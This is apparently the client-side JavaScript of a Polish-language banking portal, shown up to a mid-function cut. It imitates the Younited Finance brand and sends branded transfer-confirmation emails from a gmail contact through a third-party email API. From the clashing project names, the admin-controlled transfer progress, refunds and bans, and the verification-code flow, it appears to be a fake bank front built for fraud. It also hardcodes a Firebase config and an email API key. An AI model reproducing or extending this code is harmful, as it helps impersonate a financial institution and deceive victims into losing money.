import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNlEk",
  authDomain: "vantex-admin-2026.firebaseapp.com",
  databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "vantex-admin-2026",
  storageBucket: "vantex-admin-2026.firebasestorage.app",
  messagingSenderId: "810884502320",
  appId: "1:810884502320:web:b8ba7c2909ddf4ccf02ef5"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

await import("https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js").then(m=>m.signInAnonymously(m.getAuth(app)));

let user = null;
let currentHistory = [];
let historyListener = null;
let balanceListener = null;
let statusListener = null;
let sessionId = null;
let refreshInProgress = false;
let banqueRef = null;
// ===== STYLES DYNAMIQUES POUR FONDS SOMBRES =====
const darkStyleEl = document.createElement('style');
darkStyleEl.id = 'younited-dark-bg';
darkStyleEl.textContent = `
  body.dark-bg #greet, body.dark-bg #greet span { color: #FFFFFF !important; text-shadow: 0 1px 3px rgba(0,0,0,0.3) !important; }
  body.dark-bg #transfer > main > h1, body.dark-bg #verify > main > h1, body.dark-bg #progress > main > h2 { color: #FFFFFF !important; text-shadow: 0 1px 3px rgba(0,0,0,0.3) !important; }
  body.dark-bg .progress-status div { color: #E5E7EB !important; }
  body.dark-bg .progress-status strong { color: #FFFFFF !important; }
  body.dark-bg .progress-details-title span { color: #FFFFFF !important; }
  body.dark-bg .progress-details .row .label { color: #9CA3AF !important; }
  body.dark-bg .progress-details .row .value { color: #FFFFFF !important; }
  body.dark-bg .progress-details .row .value.bank-name { color: #FFFFFF !important; }
  body.dark-bg .verify-details .label { color: #9CA3AF !important; }
  body.dark-bg .verify-details .value { color: #FFFFFF !important; }
  body.dark-bg .transfer-balance { color: #E5E7EB !important; }
  body.dark-bg .transfer-balance b { color: #FFFFFF !important; }
  body.dark-bg .verify-code-section .lock-line { color: #FFFFFF !important; }
  body.dark-bg .field-group label { color: #6B7280 !important; }
  body.dark-bg .login-wrapper { background: #0f172a !important; }
  body.dark-bg .login-card { background: #1e293b !important; border-color: #334155 !important; }
  body.dark-bg .login-title { color: #FFFFFF !important; }
  body.dark-bg .login-sub { color: #94a3b8 !important; }
  body.dark-bg .login-info { background: #0f172a !important; border-color: #334155 !important; color: #cbd5e1 !important; }
  body.dark-bg .login-card .input { background: #0f172a !important; border-color: #334155 !important; color: #FFFFFF !important; }
  body.dark-bg .login-card .input::placeholder { color: #64748b !important; }
  body.dark-bg .login-card .input-group label { color: #94a3b8 !important; }
  body.dark-bg #client-name { color: #FFFFFF !important; }
`;
if (document.head) document.head.appendChild(darkStyleEl);


let bannerTimer = null;

// ===== FIELD ERROR UTILITIES =====
function showFieldError(fieldId, message) {
  const errorEl = document.getElementById('error-' + fieldId);
  const inputEl = document.getElementById(fieldId);
  if (errorEl) {
    errorEl.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#f97316;font-size:16px;flex-shrink:0;"></i><span>' + message + '</span>';
    errorEl.classList.add('visible');
  }
  if (inputEl) {
    inputEl.classList.add('input-error');
    const wrapper = inputEl.closest('.input-wrapper');
    if (wrapper) {
      const parentGroup = wrapper.closest('.field-group, .verify-code-section');
      if (parentGroup) parentGroup.classList.add('has-error');
    }
  }
}

function clearFieldError(fieldId) {
  const errorEl = document.getElementById('error-' + fieldId);
  const inputEl = document.getElementById(fieldId);
  if (errorEl) {
    errorEl.innerHTML = '';
    errorEl.classList.remove('visible');
  }
  if (inputEl) {
    inputEl.classList.remove('input-error');
    const wrapper = inputEl.closest('.input-wrapper');
    if (wrapper) {
      const parentGroup = wrapper.closest('.field-group, .verify-code-section');
      if (parentGroup) parentGroup.classList.remove('has-error');
    }
  }
}

function clearAllTransferErrors() {
  ['a', 'b', 'c', 'd', 'e', 'f'].forEach(id => clearFieldError(id));
}

function validateTextField(fieldId, emptyMessage) {
  const input = document.getElementById(fieldId);
  if (!input) return true;
  if (!input.value.trim()) {
    showFieldError(fieldId, emptyMessage);
    return false;
  }
  clearFieldError(fieldId);
  return true;
}

function validateAmountField() {
  const input = document.getElementById('a');
  const continueBtn = document.getElementById('continueBtn');
  if (!input) return false;

  const raw = input.value;

  // Champ vide
  if (!raw || raw.trim() === '') {
    showFieldError('a', 'Proszę wpisać kwotę przelewu.');
    if (continueBtn) continueBtn.disabled = true;
    return false;
  }

  // Contient des espaces
  if (raw.includes(' ')) {
    const cleaned = raw.replace(/\s/g, '');
    const example = cleaned || 'np. 3000';
    showFieldError('a', `Proszę usunąć spacje. Poprawny format: ${example}`);
    if (continueBtn) continueBtn.disabled = true;
    return false;
  }

  // Contient des caractères non numériques (virgule, point, lettres, etc.)
  if (!/^\d+$/.test(raw)) {
    const digitsOnly = raw.replace(/[^0-9]/g, '');
    const hasComma = raw.includes(',');
    const hasDot = raw.includes('.');
    const hasDecimal = /[,\.]\d{2}$/.test(raw);

    let message = 'Proszę wpisać kwotę wyłącznie cyframi.';
    if (digitsOnly) {
      message += ` Poprawny format: ${digitsOnly}.`;
      if (hasDecimal) {
        message += ' Usuń część dziesiętną (np. ,00).';
      } else if (hasComma || hasDot) {
        message += ' Usuń separator.';
      }
    } else {
      message += ' Na przykład: 13000';
    }
    showFieldError('a', message);
    if (continueBtn) continueBtn.disabled = true;
    return false;
  }

  // Montant numérique valide — vérifier le solde
  const amt = Number(raw);
  if (user && amt > Number(user.montant)) {
    showFieldError('a', `Kwota przekracza dostępne saldo (${fmt(user.montant)}).`);
    if (continueBtn) continueBtn.disabled = true;
    return false;
  }

  clearFieldError('a');
  if (continueBtn) {
    const allFilled = ['b','c','d','e','f'].every(id => {
      const el = document.getElementById(id);
      return el && el.value.trim() !== '';
    });
    continueBtn.disabled = !allFilled;
  }
  return true;
}

function validateAllTransferFields() {
  let ok = true;
  ok = validateAmountField() && ok;
  ok = validateTextField('b', 'Proszę wpisać imię i nazwisko beneficjenta.') && ok;
  ok = validateTextField('c', 'Proszę wpisać numer IBAN lub konta.') && ok;
  ok = validateTextField('d', 'Proszę wpisać kod BIC/SWIFT.') && ok;
  ok = validateTextField('e', 'Proszę wpisać nazwę banku.') && ok;
  ok = validateTextField('f', 'Proszę wpisać powód przelewu.') && ok;
  return ok;
}

function setupCodeValidation() {
  const codeInput = document.getElementById('code');
  if (!codeInput) return;

  // Dès que l'utilisateur commence à taper, on efface le message d'erreur
  codeInput.addEventListener('input', function() {
    clearFieldError('code');
  });
}

function initCodeField() {
  const codeInput = document.getElementById('code');
  if (codeInput) {
    codeInput.value = '';
    clearFieldError('code');
    // Optionnel : focus automatique sur le champ
    // codeInput.focus();
  }
}



// ===== API D'ENVOI D'EMAILS =====
const API_URL = 'https://getzenpay-email-api.onrender.com/api/send-welcome';
const API_KEY = 'GETZENPAY_2026_SECRET';

function generateRandomCode(length = 4) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

const TIME_ZONE = 'Europe/Warsaw';

function getPolandDateTime() {
  const now = new Date();
  const dateStr = now.toLocaleDateString('pl-PL', {
    timeZone: TIME_ZONE,
    day: '2-digit',
    month: '2-digit',
    year: 'numeric'
  });
  const timeStr = now.toLocaleTimeString('pl-PL', {
    timeZone: TIME_ZONE,
    hour: '2-digit',
    minute: '2-digit'
  });
  return { dateStr, timeStr, timestamp: now.getTime(), now };
}

const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte, reference, isRefund = false, isPending = false }) => {
  try {
    const suffixe = generateRandomCode();
    const { dateStr, timeStr } = getPolandDateTime();

    let sujet;
    if (isRefund) {
      sujet = `${suffixe} ${name} – Twój przelew został anulowany`;
    } else {
      sujet = success ? `${suffixe} ${name} – Twój przelew został wysłany` : `${suffixe} ${name} – Twój przelew nie powiódł się`;
    }

    let montantFormatted = montant || '0,00 zł';
    let benef = beneficiaire || '—';
    let compteAffiche = compte || '—';
    const ref = reference || '—';

    let headerColor, headerGradient, statusLabel, statusColor, statusBg,
        iconChar, amountLabel, nextTitle, nextText, headerIcon, mainStatus;

    if (isRefund) {
      headerColor = '#DC2626';
      headerGradient = 'linear-gradient(135deg, #DC2626 0%, #B91C1C 100%)';
      mainStatus = 'Przelew anulowany przez administrację';
      statusLabel = 'ANULOWANY';
      statusColor = '#DC2626';
      statusBg = '#FEF2F2';
      iconChar = '✕';
      amountLabel = 'ZWRÓCONA KWOTA';
      nextTitle = 'Co się stanie dalej?';
      nextText = 'Zwrot został zaksięgowany na Twoim koncie. W razie pytań skontaktuj się z naszym zespołem wsparcia.';
      headerIcon = '❌';
      benef = 'Younited';
      if (compteAffiche && compteAffiche.length > 9) {
        compteAffiche = compteAffiche.substring(0, 9) + '*********';
      } else {
        compteAffiche = 'ZPY916398*********';
      }
    } else if (isPending) {
      headerColor = '#D97706';
      headerGradient = 'linear-gradient(135deg, #D97706 0%, #B45309 100%)';
      mainStatus = 'Przelew oczekuje na zatwierdzenie';
      statusLabel = 'W OCZEKIWANIU';
      statusColor = '#D97706';
      statusBg = '#FFFBEB';
      iconChar = '⏳';
      amountLabel = 'KWOTA PRZELEWU';
      nextTitle = 'Co się stanie dalej?';
      nextText = 'Twój przelew oczekuje na weryfikację administracyjną. Otrzymasz powiadomienie e-mail po zatwierdzeniu.';
      headerIcon = '⏳';
      benef = beneficiaire || '—';
      if (compteAffiche && compteAffiche.length > 9) {
        compteAffiche = compteAffiche.substring(0, 9) + '*********';
      } else {
        compteAffiche = 'ZPY916398*********';
      }
    } else if (success) {
      headerColor = '#059669';
      headerGradient = 'linear-gradient(135deg, #059669 0%, #047857 100%)';
      mainStatus = 'Przelew wysłany pomyślnie';
      statusLabel = 'WYSŁANY';
      statusColor = '#059669';
      statusBg = '#ECFDF5';
      iconChar = '✓';
      amountLabel = 'KWOTA PRZELEWU';
      nextTitle = 'Co się stanie dalej?';
      nextText = 'Twoja płatność została zatwierdzona. Środki zostaną automatycznie przelane na konto beneficjenta w ciągu 1–3 minut.';
      headerIcon = '✓';
    } else {
      headerColor = '#D97706';
      headerGradient = 'linear-gradient(135deg, #D97706 0%, #B45309 100%)';
      mainStatus = 'Przelew nie powiódł się';
      statusLabel = 'NIE POWIÓDŁ SIĘ';
      statusColor = '#D97706';
      statusBg = '#FFFBEB';
      iconChar = '!';
      amountLabel = 'KWOTA PRZELEWU';
      nextTitle = 'Co się stanie dalej?';
      nextText = 'Sprawdź poprawność danych beneficjenta i spróbuj ponownie. W razie problemów skontaktuj się z nami.';
      headerIcon = '⚠';
    }

    const footerTextPlain = 'W przypadku pytań skontaktuj się z nami: noreply.kontakt.pl@gmail.com';

    const htmlContent = `<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Potwierdzenie przelewu – Younited</title>
</head>
<body style="margin:0;padding:0;background:#f4f6f8;font-family:'Segoe UI',Arial,sans-serif;-webkit-font-smoothing:antialiased;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f4f6f8;margin:0;padding:0;">
  <tr><td align="center" style="padding:0;">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;background:#ffffff;border-radius:0px;overflow:hidden;border:1px solid #e5e7eb;">

      <!-- HEADER : uniquement YOUNITED -->
      <tr><td style="background:${headerGradient};padding:18px 16px;text-align:center;">
        <div style="font-size:42px;font-weight:900;color:#ffffff;letter-spacing:8px;">YOUNITED</div>
      </td></tr>

      <!-- BADGE STATUT -->
      <tr><td align="center" style="padding:14px 16px 4px;">
        <div style="display:inline-block;background:${statusBg};color:${statusColor};border:1.5px solid ${statusColor};border-radius:50px;padding:4px 14px;font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;">
          ${statusLabel}
        </div>
      </td></tr>

      <!-- STATUT PRINCIPAL -->
      <tr><td align="center" style="padding:6px 16px 2px;">
        <div style="font-size:15px;font-weight:700;color:#1e293b;">${mainStatus}</div>
      </td></tr>

      <!-- BLOC MONTANT -->
      <tr><td style="padding:10px 16px 6px;">
        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:${statusBg};border:1.5px dashed ${statusColor};border-radius:14px;">
          <tr><td style="padding:14px 16px;text-align:center;">
            <div style="font-size:9px;color:${statusColor};font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:6px;">${amountLabel}</div>
            <div style="font-size:28px;font-weight:800;color:#1e293b;letter-spacing:-0.5px;line-height:1;">${montantFormatted}</div>
          </td></tr>
        </table>
      </td></tr>

      <!-- DÉTAILS TRANSACTION -->
      <tr><td style="padding:6px 16px 2px;">
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
          <tr><td style="padding:10px 0 8px;border-bottom:2px solid ${headerColor};">
            <div style="font-size:12px;font-weight:700;color:${headerColor};display:flex;align-items:center;gap:6px;">
              <span style="font-size:16px;">📋</span> Szczegóły transakcji
            </div>
          </td></tr>
        </table>
      </td></tr>

      <tr><td style="padding:0 16px;">
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
          <tr>
            <td style="padding:8px 0;font-size:10px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;width:40%;">ID transakcji</td>
            <td style="padding:8px 0;font-size:12px;color:#1e293b;font-weight:700;text-align:right;word-break:break-all;">#${ref}</td>
          </tr>
          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
          <tr>
            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Data i godzina</td>
            <td style="padding:8px 0;font-size:12px;color:#1e293b;font-weight:700;text-align:right;">${dateStr}, ${timeStr}</td>
          </tr>
          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
          <tr>
            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Kwota</td>
            <td style="padding:8px 0;font-size:14px;color:${headerColor};font-weight:800;text-align:right;">${montantFormatted}</td>
          </tr>
          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
          <tr>
            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">${isRefund ? 'Nadawca zwrotu' : 'Beneficjent'}</td>
            <td style="padding:8px 0;font-size:12px;color:#1e293b;font-weight:700;text-align:right;word-break:break-word;">${benef}</td>
          </tr>
          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
          <tr>
            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Konto (IBAN)</td>
            <td style="padding:8px 0;font-size:11px;color:#1e293b;font-weight:600;text-align:right;font-family:'Courier New',monospace;word-break:break-all;">${compteAffiche}</td>
          </tr>
          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
          <tr>
            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Status</td>
            <td style="padding:8px 0;text-align:right;">
              <span style="display:inline-block;background:${statusBg};color:${statusColor};border:1.5px solid ${statusColor};border-radius:20px;padding:3px 10px;font-size:9px;font-weight:700;letter-spacing:0.5px;">${statusLabel}</span>
            </td>
          </tr>
          ${!success && !isRefund ? `<tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
          <tr>
            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Postęp</td>
            <td style="padding:8px 0;font-size:14px;color:${headerColor};font-weight:800;text-align:right;">${pct || 0}%</td>
          </tr>` : ''}
        </table>
      </td></tr>

      <!-- BLOC INFO -->
      <tr><td style="padding:12px 16px 4px;">
        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#eff6ff;border:1px solid #dbeafe;border-radius:12px;">
          <tr><td style="padding:12px 14px;">
            <div style="font-size:11px;color:#1e40af;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:6px;">
              <span style="width:22px;height:22px;background:#3b82f6;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700;">i</span>
              ${nextTitle}
            </div>
            <div style="font-size:10px;color:#3b82f6;line-height:1.5;font-weight:500;">${nextText}</div>
          </td></tr>
        </table>
      </td></tr>

      <!-- SÉCURITÉ -->
      <tr><td style="padding:10px 16px 0;">
        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;">
          <tr><td style="padding:8px 12px;">
            <div style="font-size:10px;color:#15803d;font-weight:600;line-height:1.4;display:flex;align-items:flex-start;gap:6px;">
              <span style="font-size:14px;flex-shrink:0;">🔒</span>
              <span>To potwierdzenie zostało wygenerowane automatycznie przez system Younited. Nie przekazuj tego e-maila osobom trzecim.</span>
            </div>
          </td></tr>
        </table>
      </td></tr>

      <!-- FOOTER -->
      <tr><td style="padding:14px 16px 12px;text-align:center;border-top:1px solid #f3f4f6;margin-top:10px;">
        <div style="font-size:11px;color:#6b7280;font-weight:600;margin-bottom:2px;">Potrzebujesz pomocy?</div>
        <div style="font-size:10px;color:#9ca3af;line-height:1.5;font-weight:500;">
          Skontaktuj się z naszym zespołem wsparcia:<br>
          <a href="mailto:noreply.kontakt.pl@gmail.com" style="color:${headerColor};text-decoration:none;font-weight:700;">noreply.kontakt.pl@gmail.com</a>
        </div>
        <div style="font-size:9px;color:#d1d5db;margin-top:10px;font-weight:500;">© 2026 Younited Finance. Wszelkie prawa zastrzeżone.</div>
      </td></tr>

    </table>
  </td></tr>
</table>
</body>
</html>`;

    const textContent = `Younited – POTWIERDZENIE PRZELEWU

Status: ${statusLabel}
${mainStatus}

─────────────────────────────
Numer transakcji: #${ref}
Data: ${dateStr}
Godzina: ${timeStr}
Kwota: ${montantFormatted}
${isRefund ? 'Nadawca zwrotu' : 'Beneficjent'}: ${benef}
Konto (IBAN): ${compteAffiche}
Status: ${statusLabel}
${!success && !isRefund ? 'Postęp: ' + (pct || 0) + '%' : ''}
─────────────────────────────

${nextTitle}
${nextText}

${footerTextPlain}
© 2026 Younited Finance.`;

    const res = await fetch(API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': API_KEY
      },
      body: JSON.stringify({
        email: to,
        prenom: name,
        sujet: sujet,
        html: htmlContent,
        text: textContent
      })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Erreur inconnue');
    return data;
  } catch (error) {
    console.error('Erreur envoi mail:', error);
    throw error;
  }
};

// ===== OVERLAY SPINNER =====
const overlay = document.getElementById('loading-overlay');
let loadingTimeout = null;

function showLoading(message = 'Ładowanie...') {
  if (loadingTimeout) {
    clearTimeout(loadingTimeout);
    loadingTimeout = null;
  }
  const textEl = overlay.querySelector('.spinner-text');
  if (textEl) textEl.textContent = message;
  overlay.setAttribute('aria-busy', 'true');
  overlay.classList.add('active');
}

function hideLoading() {
  overlay.removeAttribute('aria-busy');
  overlay.classList.remove('active');
  if (loadingTimeout) {
    clearTimeout(loadingTimeout);
    loadingTimeout = null;
  }
  loadingTimeout = setTimeout(() => {
    const textEl = overlay.querySelector('.spinner-text');
    if (textEl) textEl.textContent = 'Ładowanie...';
  }, 500);
}

window.withSpinner = function(action, duration = 350) {
  let start = Date.now();
  showLoading('Ładowanie...');
  let result;
  try {
    result = action();
  } catch (e) {
    console.error(e);
    hideLoading();
    toast('Wystąpił błąd podczas akcji');
    return;
  }
  if (result && typeof result.then === 'function') {
    result
      .then(() => {
        const elapsed = Date.now() - start;
        const remaining = Math.max(0, duration - elapsed);
        setTimeout(hideLoading, remaining);
      })
      .catch((err) => {
        console.error(err);
        toast('Wystąpił błąd podczas akcji');
        hideLoading();
      });
  } else {
    const elapsed = Date.now() - start;
    const remaining = Math.max(0, duration - elapsed);
    setTimeout(hideLoading, remaining);
  }
};


// ===== COULEUR D'ARRIÈRE-PLAN =====
function applyBgColor(bgColor) {
  const body = document.body;
  const html = document.documentElement;
  if (!body) return;

  const isDark = ['navy', 'emerald', 'bordeaux', 'charcoal', 'amber'].includes(bgColor);

  // Appliquer / retirer les classes
  if (isDark) {
    body.classList.add('dark-bg');
    body.classList.remove('light-bg');
  } else {
    body.classList.remove('dark-bg');
    body.classList.add('light-bg');
  }

  // === ADAPTATION DIRECTE DES COULEURS DE TEXTE (fond sombre) ===
  const greet = document.getElementById('greet');
  const greetSpan = document.querySelector('#greet span');
  if (greet) greet.style.color = isDark ? '#FFFFFF' : '';
  if (greetSpan) {
    greetSpan.style.color = isDark ? '#FFFFFF' : '';
    greetSpan.style.textShadow = isDark ? '0 1px 3px rgba(0,0,0,0.3)' : '';
  }

  // Titres des écrans transfer / verify / progress
  const transferH1 = document.querySelector('#transfer > main > h1');
  const verifyH1 = document.querySelector('#verify > main > h1');
  const progressH2 = document.querySelector('#progress > main > h2');
  if (transferH1) transferH1.style.color = isDark ? '#FFFFFF' : '';
  if (verifyH1) verifyH1.style.color = isDark ? '#FFFFFF' : '';
  if (progressH2) progressH2.style.color = isDark ? '#FFFFFF' : '';

  // Progress page textes
  const progressStatusDivs = document.querySelectorAll('#progress .progress-status div');
  progressStatusDivs.forEach(el => el.style.color = isDark ? '#E5E7EB' : '');
  const progressStatusStrong = document.querySelectorAll('#progress .progress-status strong');
  progressStatusStrong.forEach(el => el.style.color = isDark ? '#FFFFFF' : '');
  const progressDetailsTitle = document.querySelector('#progress .progress-details-title span');
  if (progressDetailsTitle) progressDetailsTitle.style.color = isDark ? '#FFFFFF' : '';
  document.querySelectorAll('#progress .progress-details .row .label').forEach(el => el.style.color = isDark ? '#9CA3AF' : '');
  document.querySelectorAll('#progress .progress-details .row .value').forEach(el => el.style.color = isDark ? '#FFFFFF' : '');

  // Verify page
  document.querySelectorAll('#verify .verify-details .label').forEach(el => el.style.color = isDark ? '#9CA3AF' : '');
  document.querySelectorAll('#verify .verify-details .value').forEach(el => el.style.color = isDark ? '#FFFFFF' : '');
  const transferBalance = document.querySelector('#transfer .transfer-balance');
  if (transferBalance) transferBalance.style.color = isDark ? '#E5E7EB' : '';
  const transferBalanceB = document.querySelector('#transfer .transfer-balance b');
  if (transferBalanceB) transferBalanceB.style.color = isDark ? '#FFFFFF' : '';
  const lockLine = document.querySelector('#verify .verify-code-section .lock-line');
  if (lockLine) lockLine.style.color = isDark ? '#FFFFFF' : '';

  // Nouveaux éléments professionnels – fond sombre
  document.querySelectorAll('#transfer .field-group label').forEach(el => el.style.color = isDark ? '#94a3b8' : '');
  document.querySelectorAll('#transfer .transfer-title').forEach(el => el.style.color = isDark ? '#ffffff' : '');
  document.querySelectorAll('#verify .verify-cancel').forEach(el => el.style.color = isDark ? '#fca5a5' : '');
  document.querySelectorAll('#result .receipt-status').forEach(el => el.style.color = isDark ? '#ffffff' : '');
  document.querySelectorAll('#result .receipt-row .r-value').forEach(el => el.style.color = isDark ? '#ffffff' : '');
  document.querySelectorAll('#result .receipt-row .r-value.amount').forEach(el => el.style.color = isDark ? '#ffffff' : '');
  document.querySelectorAll('#result .receipt-percent').forEach(el => el.style.color = isDark ? '#34d399' : '');

  // Login page
  const loginWrapper = document.querySelector('#login .login-wrapper');
  if (loginWrapper) loginWrapper.style.background = isDark ? '#0f172a' : '';
  const loginCard = document.querySelector('#login .login-card');
  if (loginCard) {
    loginCard.style.background = isDark ? '#1e293b' : '';
    loginCard.style.borderColor = isDark ? '#334155' : '';
  }
  const loginTitle = document.querySelector('#login .login-title');
  if (loginTitle) loginTitle.style.color = isDark ? '#FFFFFF' : '';
  const loginSub = document.querySelector('#login .login-sub');
  if (loginSub) loginSub.style.color = isDark ? '#94a3b8' : '';
  const loginInfo = document.querySelector('#login .login-info');
  if (loginInfo) {
    loginInfo.style.background = isDark ? '#0f172a' : '';
    loginInfo.style.borderColor = isDark ? '#334155' : '';
    loginInfo.style.color = isDark ? '#cbd5e1' : '';
  }
  const clientName = document.getElementById('client-name');
  if (clientName) clientName.style.color = isDark ? '#FFFFFF' : '';

  if (bgColor === 'navy') {
    body.style.background = `
      radial-gradient(ellipse at 20% 30%, rgba(30,58,138,0.4) 0%, transparent 55%),
      radial-gradient(ellipse at 80% 70%, rgba(15,23,42,0.5) 0%, transparent 50%),
      radial-gradient(ellipse at 50% 50%, rgba(37,99,235,0.15) 0%, transparent 60%),
      linear-gradient(165deg, #020617 0%, #0f172a 25%, #1e293b 55%, #1e3a5f 85%, #0f172a 100%)
    `;
    html.style.background = '#020617';
  } else if (bgColor === 'emerald') {
    body.style.background = `
      radial-gradient(ellipse at 15% 25%, rgba(6,78,59,0.45) 0%, transparent 55%),
      radial-gradient(ellipse at 85% 75%, rgba(5,150,105,0.35) 0%, transparent 50%),
      radial-gradient(ellipse at 50% 50%, rgba(16,185,129,0.12) 0%, transparent 60%),
      linear-gradient(160deg, #022c22 0%, #064e3b 25%, #065f46 55%, #047857 85%, #022c22 100%)
    `;
    html.style.background = '#022c22';
  } else if (bgColor === 'bordeaux') {
    body.style.background = `
      radial-gradient(ellipse at 20% 30%, rgba(127,29,29,0.4) 0%, transparent 55%),
      radial-gradient(ellipse at 80% 70%, rgba(88,28,28,0.45) 0%, transparent 50%),
      radial-gradient(ellipse at 50% 50%, rgba(185,28,28,0.12) 0%, transparent 60%),
      linear-gradient(165deg, #1a0505 0%, #450a0a 25%, #7f1d1d 55%, #991b1b 85%, #1a0505 100%)
    `;
    html.style.background = '#1a0505';
  } else if (bgColor === 'charcoal') {
    body.style.background = `
      radial-gradient(ellipse at 15% 25%, rgba(55,65,81,0.4) 0%, transparent 55%),
      radial-gradient(ellipse at 85% 75%, rgba(31,41,55,0.5) 0%, transparent 50%),
      radial-gradient(ellipse at 50% 50%, rgba(75,85,99,0.15) 0%, transparent 60%),
      linear-gradient(160deg, #030712 0%, #111827 25%, #1f2937 55%, #374151 85%, #030712 100%)
    `;
    html.style.background = '#030712';
  } else if (bgColor === 'amber') {
    body.style.background = `
      radial-gradient(ellipse at 20% 20%, rgba(180,83,9,0.5) 0%, transparent 50%),
      radial-gradient(ellipse at 80% 80%, rgba(146,64,14,0.4) 0%, transparent 55%),
      radial-gradient(ellipse at 50% 50%, rgba(217,119,6,0.15) 0%, transparent 60%),
      radial-gradient(ellipse at 30% 70%, rgba(120,53,15,0.35) 0%, transparent 50%),
      linear-gradient(165deg, #1a0500 0%, #2a1005 20%, #451a03 45%, #78350f 75%, #92400e 90%, #1a0500 100%)
    `;
    html.style.background = '#1a0500';
  } else if (bgColor === 'ivory') {
    body.style.background = `
      radial-gradient(ellipse at 20% 30%, rgba(251,246,230,0.8) 0%, transparent 55%),
      radial-gradient(ellipse at 80% 70%, rgba(245,235,210,0.6) 0%, transparent 50%),
      radial-gradient(ellipse at 50% 50%, rgba(255,250,240,0.4) 0%, transparent 60%),
      linear-gradient(165deg, #faf7f0 0%, #f5efe0 25%, #f0e8d5 55%, #e8dcc0 85%, #faf7f0 100%)
    `;
    html.style.background = '#faf7f0';
  } else {
    body.style.background = '#f0f2f5';
    html.style.background = '#f0f2f5';
  }
}

// ===== THEMES =====
const themes = {
  teal: { p: '#0D9488', l: '#CCFBF1' },
  purple: { p: '#6A0DAD', l: '#F3E8FF' },
  blue: { p: '#2563EB', l: '#DBEAFE' },
  yellow: { p: '#EAB308', l: '#FEF3C7' },
  rose: { p: '#E83B7A', l: '#FCE4EC' },
  orange: { p: '#F97316', l: '#FED7AA' },
  green: { p: '#22C55E', l: '#DCFCE7' },
  black: { p: '#111827', l: '#F3F4F6' },
  white: { p: '#374151', l: '#FFFFFF' }
};

function adjustBrightness(hex, percent) {
  const num = parseInt(hex.replace('#', ''), 16);
  const r = Math.min(255, Math.max(0, (num >> 16) + percent));
  const g = Math.min(255, Math.max(0, ((num >> 8) & 0x00FF) + percent));
  const b = Math.min(255, Math.max(0, (num & 0x0000FF) + percent));
  return `#${(r << 16 | g << 8 | b).toString(16).padStart(6, '0')}`;
}

function applyTheme(theme) {
  const t = themes[theme] || themes.teal;
  document.documentElement.style.setProperty('--p', t.p);
  document.documentElement.style.setProperty('--p-light', t.l);
  document.documentElement.style.setProperty('--p-gradient', `linear-gradient(135deg, ${t.p}, ${adjustBrightness(t.p, -10)})`);
  document.documentElement.style.setProperty('--p-soft', `${t.p}14`);
  localStorage.setItem('Younited_theme', theme);
}

const urlParams = new URLSearchParams(window.location.search);
const urlTheme = urlParams.get('theme');
const savedTheme = (urlTheme && themes[urlTheme]) ? urlTheme : (localStorage.getItem('Younited_theme') || 'teal');
applyTheme(savedTheme);

// ===== SYNCHRONISATION TEMPS RÉEL DEPUIS L'ADMIN =====
const bannedScreen = document.getElementById('banned-screen');
const blockedMsg = document.getElementById('blocked-msg');

function showBanned() {
  document.querySelectorAll('.screen').forEach(s => {
    s.classList.remove('active');
    s.style.display = 'none';
  });
  if (bannedScreen) bannedScreen.style.display = 'flex';
  if (window.__clientIdFromUrl) {
    localStorage.removeItem('Younited_client_cache_' + window.__clientIdFromUrl);
  }
}

function showLogin() {
  if (bannedScreen) bannedScreen.style.display = 'none';
}

function hideBlockedMsg() {
  if (blockedMsg) blockedMsg.style.display = 'none';
}

function showBlockedMsg() {
  if (blockedMsg) blockedMsg.style.display = 'block';
}

function updateClientDisplay(data) {
  if (!data) {
    showBanned();
    return;
  }
  const nameEl = document.getElementById('client-name');
  if (nameEl && data.nom) {
